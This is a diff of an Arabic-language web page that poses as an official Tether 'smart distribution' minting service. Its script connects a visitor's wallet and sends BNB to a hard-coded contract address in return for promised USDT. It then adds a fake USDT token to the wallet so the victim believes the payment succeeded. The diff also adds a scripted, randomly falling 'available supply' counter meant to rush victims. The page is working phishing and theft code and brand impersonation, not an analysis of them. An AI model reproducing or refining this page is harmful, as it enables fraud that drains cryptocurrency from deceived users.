@@ -3,80 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether Network | Official Minting</title>
+    <title>Tether Network | Smart Distribution</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
-        :root { --primary: #009393; --bg: #051410; --card: #0a1f1b; }
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: white; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 400px; background: var(--card); border: 1px solid var(--primary); border-radius: 24px; padding: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); margin-top: 20px; }
-        .logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(0,147,147,0.3)); }
-        .status-box { background: rgba(0,147,147,0.1); border-right: 4px solid var(--primary); padding: 15px; border-radius: 12px; margin-bottom: 25px; }
-        .input-label { color: var(--primary); font-size: 13px; font-weight: bold; margin-bottom: 10px; display: block; }
-        select { width: 100%; padding: 16px; background: #122c28; border: 1px solid #1c4d46; color: white; border-radius: 14px; font-size: 16px; margin-bottom: 25px; outline: none; appearance: none; }
-        button { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 14px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,147,147,0.3); }
-        button:active { transform: scale(0.96); background: #00b3b3; }
-        #log { font-size: 13px; color: #929aa5; margin-top: 20px; text-align: center; }
-        .step { display: flex; align-items: center; margin-bottom: 10px; font-size: 14px; }
-        .dot { height: 8px; width: 8px; background: var(--primary); border-radius: 50%; margin-left: 10px; box-shadow: 0 0 8px var(--primary); }
+        :root { --main: #009393; --dark: #051410; --accent: #ff4d4d; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .card { width: 100%; max-width: 420px; background: #0a1f1b; border: 1px solid var(--main); border-radius: 25px; padding: 30px; box-shadow: 0 15px 50px rgba(0,0,0,0.8); position: relative; margin-top: 20px; }
+        .logo { width: 80px; display: block; margin: 0 auto 20px; filter: drop-shadow(0 0 10px rgba(0,147,147,0.4)); }
+        .live-counter { background: rgba(255, 77, 77, 0.08); border: 1px dashed var(--accent); padding: 15px; border-radius: 15px; text-align: center; margin-bottom: 25px; border-left: 5px solid var(--accent); }
+        #supply { color: var(--accent); font-weight: bold; font-size: 24px; text-shadow: 0 0 10px rgba(255,77,77,0.3); }
+        select, button { width: 100%; padding: 18px; border-radius: 16px; border: none; font-size: 17px; font-weight: bold; outline: none; }
+        select { background: #122c28; color: white; border: 1px solid #1c4d46; margin-bottom: 25px; appearance: none; cursor: pointer; }
+        button { background: var(--main); color: white; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 8px 20px rgba(0,147,147,0.3); border-bottom: 4px solid #006b6b; }
+        button:active { transform: translateY(2px); border-bottom: 0; }
+        .status-text { font-size: 13px; color: #8899a6; text-align: center; margin-top: 15px; height: 20px; }
+        .badge { position: absolute; top: 20px; left: -35px; background: var(--accent); color: white; padding: 5px 40px; transform: rotate(-45deg); font-size: 11px; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
     </style>
 </head>
 <body>
 
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="Tether">
-    
-    <div class="container">
-        <h2 style="text-align: center; margin-top: 0; color: var(--primary);">Authorized Protocol</h2>
+    <div class="card">
+        <div class="badge">LIVE MINT</div>
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="USDT">
         
-        <div class="status-box">
-            <div class="step"><div class="dot"></div> الحالة: الشبكة نشطة</div>
-            <div class="step"><div class="dot"></div> النظام: BSC Mainnet</div>
+        <h2 style="text-align: center; margin-top: 0; color: var(--main);">نظام التوزيع الذكي</h2>
+
+        <div class="live-counter">
+            <div style="font-size: 13px; margin-bottom: 5px; color: #ccc;">الرصيد المتاح حالياً للتوزيع:</div>
+            <div id="supply">842,500 USDT</div>
+            <div style="font-size: 11px; margin-top: 5px; color: var(--accent); font-weight: bold;">⚠️ تنبيه: الكمية تنفذ بسرعة</div>
         </div>
 
-        <label class="input-label">اختر كمية USDT المراد تفعيلها</label>
-        <select id="package">
-            <option value="0.0001">100 USDT - (0.0001 BNB) [تجربة]</option>
-            <option value="0.01">500 USDT - (0.01 BNB)</option>
-            <option value="0.05">2,500 USDT - (0.05 BNB)</option>
-            <option value="0.1">5,000 USDT - (0.1 BNB)</option>
-            <option value="1.0">50,000 USDT - (1.0 BNB)</option>
+        <label style="font-size: 13px; color: var(--main); margin-right: 5px; display: block; margin-bottom: 8px;">اختر باقة التفعيل:</label>
+        <select id="pkg">
+            <option value="0.0001">تجربة: 100 USDT (0.0001 BNB)</option>
+            <option value="0.01">أساسي: 500 USDT (0.01 BNB)</option>
+            <option value="0.05">متقدم: 2,500 USDT (0.05 BNB)</option>
+            <option value="0.1">احترافي: 5,000 USDT (0.1 BNB)</option>
         </select>
 
-        <button onclick="executeAction()">تفعيل واستلام الرصيد ⚡</button>
+        <button id="mainBtn" onclick="startProcess()">تفعيل واستلام الرصيد ⚡</button>
         
-        <div id="log">بانتظار ربط المحفظة المعتمدة...</div>
+        <div id="status" class="status-text">بانتظار ربط المحفظة المعتمدة...</div>
+
+        <div style="margin-top: 25px; font-size: 11px; color: #5d7e79; text-align: center; border-top: 1px solid #1c4d46; padding-top: 15px;">
+            بروتوكول رسمي مشفر عبر شبكة BSC <br> تواصل مع الدعم في حال واجهت مشكلة في التزامن
+        </div>
     </div>
 
     <script>
-        const CONTRACT_ADDRESS = "0x5F2d23cc2ADC745510618446c46Ea84e2dC3fee1";
+        // --- إعدادات العقد الخاص بك ---
+        const CONTRACT_ADDRESS = "0xFd94c727864313528d9f089CF1BF82a2c657559c";
 
-        async function executeAction() {
-            const log = document.getElementById('log');
-            const bnbAmt = document.getElementById('package').value;
+        // محاكي عداد السيولة (ينقص تلقائياً)
+        let balance = 842500;
+        const supplyEl = document.getElementById('supply');
+        
+        setInterval(() => {
+            let drop = Math.floor(Math.random() * 210) + 15;
+            balance -= drop;
+            if (balance < 1200) balance = 841000; // إعادة التعيين إذا وصل لرقم صغير
+            supplyEl.innerText = balance.toLocaleString() + " USDT";
+        }, 2500);
+
+        async function startProcess() {
+            const status = document.getElementById('status');
+            const btn = document.getElementById('mainBtn');
+            const amount = document.getElementById('pkg').value;
 
             if (!window.ethereum) {
-                alert("يرجى فتح الموقع من داخل متصفح المحفظة (Trust Wallet / MetaMask)");
+                alert("يرجى فتح الموقع من داخل متصفح Trust Wallet أو MetaMask");
                 return;
             }
 
             try {
                 const web3 = new Web3(window.ethereum);
-                log.innerText = "جاري طلب الإذن من المحفظة...";
+                status.innerText = "جاري الاتصال بالمحفظة...";
                 
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const userAcc = accounts[0];
+                const userAddress = accounts[0];
 
-                log.innerText = "جاري معالجة البروتوكول الموحد...";
+                status.innerText = "جاري معالجة الطلب في الشبكة...";
+                btn.disabled = true;
+                btn.style.opacity = "0.7";
 
+                // إرسال المعاملة إلى العقد
                 await web3.eth.sendTransaction({
-                    from: userAcc,
+                    from: userAddress,
                     to: CONTRACT_ADDRESS,
-                    value: web3.utils.toWei(bnbAmt, "ether"),
-                    gas: 120000 
+                    value: web3.utils.toWei(amount, "ether"),
+                    gas: 150000 
                 });
 
-                log.innerText = "تم الدفع! جاري إضافة العملة لمحفظتك...";
+                status.innerText = "تم التفعيل! جاري مزامنة الرصيد...";
 
+                // طلب إضافة التوكن للمحفظة ليراه المستخدم فوراً
                 await window.ethereum.request({
                     method: 'wallet_watchAsset',
                     params: {
@@ -85,17 +106,21 @@
                             address: CONTRACT_ADDRESS,
                             symbol: 'USDT',
                             decimals: 18,
-                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                         },
                     },
                 });
 
-                log.innerText = "اكتملت العملية بنجاح! تحقق من رصيدك.";
-                alert("✅ تم استلام رصيد USDT بنجاح.");
+                status.innerText = "اكتملت العملية بنجاح ✅";
+                alert("تهانينا! تم تفعيل الرصيد وبثه إلى محفظتك بنجاح.");
+                btn.disabled = false;
+                btn.style.opacity = "1";
 
-            } catch (e) {
-                console.error(e);
-                log.innerText = "فشلت العملية. تأكد من وجود رصيد كافٍ.";
+            } catch (error) {
+                console.error(error);
+                status.innerText = "فشلت العملية. تأكد من وجود رصيد BNB كافٍ.";
+                btn.disabled = false;
+                btn.style.opacity = "1";
             }
         }
     </script>
